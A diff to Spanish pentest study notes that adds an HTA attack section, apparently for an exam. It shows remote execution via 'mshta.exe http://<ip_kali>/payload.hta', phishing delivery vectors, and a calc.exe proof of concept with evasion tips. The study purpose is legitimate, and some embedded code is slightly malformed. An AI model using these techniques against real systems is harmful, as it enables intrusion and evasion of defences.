@@ -764,17 +764,67 @@ End Sub
 # - Combinar ActiveX + payload real = técnica efectiva de evasión
 ```
 
-#### Pretexting Phishing Documents
-
-```bash
-
-
-```
-
 #### HTML Applications (HTA)
 
 ```bash
+#### HTML Applications (HTA)
+
+# Qué es HTA
+# Archivo HTML que se ejecuta como aplicación de escritorio via mshta.exe
+# A diferencia de una página web, tiene acceso completo al sistema
+# Bypasea el sandbox del browser — puede ejecutar comandos, acceder al filesystem, etc.
+# Extensión: .hta
+# Limitación: requiere Internet Explorer (usa el motor Trident/VBScript)
+# En entornos corporativos con apps legacy, IE suele estar habilitado
+
+# mshta.exe
+# Intérprete nativo de Windows para archivos .hta
+# Viene instalado por defecto en Windows — living off the land
+# Permite ejecutar .hta remoto sin que el archivo toque el disco:
+# mshta.exe http://<ip_kali>/payload.hta
+
+# Vectores de entrega
+# - Email con .hta adjunto
+# - Link a .hta hosteado en servidor del atacante
+# - Ejecutar desde Win+R: http://<ip_kali>/payload.hta
+
+# Demo — HTA básico (Proof of Concept)
+# Crear el archivo en el servidor web de Kali
+
+cd /var/www/html
+vim poc.hta
+
+# Contenido del poc.hta:
+<html>
+    <head>
+        <script>
+            var payload = 'calc.exe'
+            new ActiveXObject('Wscript.Shell').Run(payload);  # ejecuta el payload
+        </script>
+    </head>
+    <body>
+        <h1>HTA PoC</h1>
+        <script>
+            self.close();    # cierra la ventana HTA inmediatamente — evasión
+        </script>
+    </body>
+</html>
+
+# Servir via Apache
+sudo systemctl start apache2
+netstat -antp    # verificar que apache está escuchando en puerto 80
+
+# Desde la máquina víctima (Windows):
+# Abrir browser o Win+R → http://<ip_kali>/poc.hta
+# mshta.exe interpreta el archivo y ejecuta el payload
+
+# Puntos clave para el examen
+# - ActiveXObject('Wscript.Shell').Run() es el equivalente a WScript.Shell en VBA
+# - self.close() cierra la ventana HTA para no levantar sospechas
+# - Se puede reemplazar 'calc.exe' por cualquier payload (reverse shell, dropper, etc.)
+# - mshta.exe es un binario legítimo — evade application whitelisting
 ```
+
 #### HTA Attacks
 
 ```bash
